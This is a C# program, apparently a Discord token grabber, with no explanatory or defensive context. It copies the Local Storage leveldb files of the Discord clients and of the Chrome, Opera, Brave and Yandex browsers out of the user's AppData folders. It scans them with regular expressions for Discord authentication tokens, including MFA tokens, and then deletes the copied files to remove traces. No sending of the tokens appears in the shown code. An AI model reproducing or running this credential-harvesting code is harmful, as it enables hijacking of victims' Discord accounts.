using System.Text.RegularExpressions;

string FixPath = "platforms";
string? Local = Environment.GetEnvironmentVariable("LOCALAPPDATA");
string? Roaming = Environment.GetEnvironmentVariable("APPDATA");

List<string> Tokens = new();

List<string> Patterns = new()
{
    @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
    @"mfa\.[\w-]{84}"
};

List<string> DirectoriesList = new()
{
    "Google Chrome",
    "Discord",
    "Discord Canary",
    "Discord PTB",
    "Opera",
    "Brave",
    "Yandex"
};

Dictionary<string, string> Paths = new()
{
    ["Discord"] = $@"{Roaming}/Discord",
    ["Discord Canary"] = $@"{Roaming}/discordcanary",
    ["Discord PTB"] = $@"{Roaming}/discordptb",
    ["Google Chrome"] = $@"{Local}/Google/Chrome/User Data/Default",
    ["Opera"] = $@"{Roaming}/Opera Software/Opera Stable",
    ["Brave"] = $@"{Local}/BraveSoftware/Brave-Browser/User Data/Default",
    ["Yandex"] = $@"{Local}/Yandex/YandexBrowser/User Data/Default"
};

CreateDirectories();
Copy();
GetTokens();


void CopyFiles(string Platform, string Path)
{
    Path += @"/Local Storage/leveldb";

    if (Directory.Exists(Path))
    {
        foreach (string FileName in Directory.GetFiles(Path))
        {
            if (FileName.EndsWith(".log") || FileName.EndsWith(".ldb"))
            {
                string getFileName = Regex.Match(FileName, "/leveldb(.+)").Groups[1].Value;

                string filename = "";

                if (getFileName.Contains(@"\"))
                    filename = getFileName.Replace(@"\", "");

                string fullnewPath = $"{FixPath}/{Platform}/{filename}";

                if (!File.Exists(fullnewPath))
                    File.Copy(FileName, fullnewPath);

            }
        }
    }
}

void GetTokens()
{
    foreach (var directory in Directory.GetDirectories($"{FixPath}"))
    {
        string directory_ = directory.Replace(@"platforms\", "");

        foreach (string file in Directory.GetFiles($"{FixPath}/{directory_}")) 
        {
            var open = File.OpenText(file);
            string readline = open.ReadToEnd();

            foreach (string Pattern in Patterns) 
            {
                foreach (var token in Regex.Matches(readline, Pattern)) 
                {
                    if (!Tokens.Contains(token)) Tokens.Add(token.ToString());
                }
            }

            open.Close();

        }

    }

    Finish();
}

void CreateDirectories()
{
    foreach (var directory in DirectoriesList)
        if (!Directory.Exists($"{FixPath}/{directory}"))
            Directory.CreateDirectory($"{FixPath}/{directory}");
}

void Finish()
{
    foreach (var directory in DirectoriesList)
    {
        if (Directory.Exists($"{FixPath}/{directory}") && Directory.GetFiles($"{FixPath}/{directory}").Length >= 1)
        {
            foreach (var file in Directory.GetFiles($"{FixPath}/{directory}")) 
            {
                File.Delete(file);
            }
        }
        Directory.Delete($"{FixPath}/{directory}");
    }
    Directory.Delete(FixPath);
}

void Copy() 
{
    foreach (var path in Paths) 
    {
        CopyFiles(path.Key, path.Value);
    }
}

Console.ReadLine();